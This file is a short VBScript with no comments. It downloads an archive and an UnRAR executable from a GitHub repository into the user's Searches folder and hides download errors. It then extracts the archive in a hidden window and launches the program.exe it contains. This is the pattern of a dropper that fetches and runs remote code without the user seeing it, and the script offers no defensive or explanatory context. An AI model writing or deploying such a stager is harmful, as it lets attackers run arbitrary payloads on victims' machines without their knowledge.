Option Explicit

Dim url1, url2, filename1, filename2, savePath, unrarPath, extractPath
url1 = "https://github.com/usa877/kingmoon/raw/main/program.rar"
url2 = "https://github.com/usa877/kingmoon/raw/main/UnRAR.exe"
filename1 = "program.rar"
filename2 = "UnRAR.exe"
savePath = "C:\Users\" & CreateObject("WScript.Shell").ExpandEnvironmentStrings("%username%") & "\Searches\"
extractPath = savePath

Dim xmlHttp
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")

Sub DownloadFile(url, filename)
    On Error Resume Next
    xmlHttp.Open "GET", url, False
    xmlHttp.Send

    If xmlHttp.Status = 200 Then
        Dim stream
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write xmlHttp.responseBody
        If Not CreateObject("Scripting.FileSystemObject").FolderExists(savePath) Then
            CreateObject("Scripting.FileSystemObject").CreateFolder(savePath)
        End If
        stream.SaveToFile savePath & filename, 2
        stream.Close
        Set stream = Nothing
    End If
    On Error GoTo 0
End Sub

DownloadFile url1, filename1
DownloadFile url2, filename2

Set xmlHttp = Nothing

Dim shell
Set shell = CreateObject("WScript.Shell")
Dim command
unrarPath = savePath & filename2
If CreateObject("Scripting.FileSystemObject").FileExists(unrarPath) Then
    If Not CreateObject("Scripting.FileSystemObject").FolderExists(extractPath) Then
        CreateObject("Scripting.FileSystemObject").CreateFolder(extractPath)
    End If
    
    command = """" & unrarPath & """ x """ & savePath & filename1 & """ """ & extractPath & """"
    shell.Run command, 0, True
    
    Dim exePath
    exePath = extractPath & "program\program.exe"
    If CreateObject("Scripting.FileSystemObject").FileExists(exePath) Then
        shell.Run """" & exePath & """", 1, False
    End If
End If
